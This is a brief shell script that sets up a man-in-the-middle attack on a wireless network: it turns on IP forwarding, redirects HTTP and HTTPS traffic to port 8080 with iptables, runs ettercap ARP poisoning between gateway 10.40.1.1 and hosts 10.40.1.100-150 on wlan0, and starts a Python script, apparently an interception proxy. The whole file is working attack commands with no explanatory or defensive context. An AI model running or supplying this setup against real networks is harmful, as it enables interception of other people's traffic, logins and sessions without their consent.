#!/bin/sh

sysctl -w net.ipv4.ip_forward=1

iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080 &
iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080 &

ettercap -TqP autoadd -M arp:remote -i wlan0 -S /10.40.1.1// /10.40.1.100-150// &

python3 general.py &

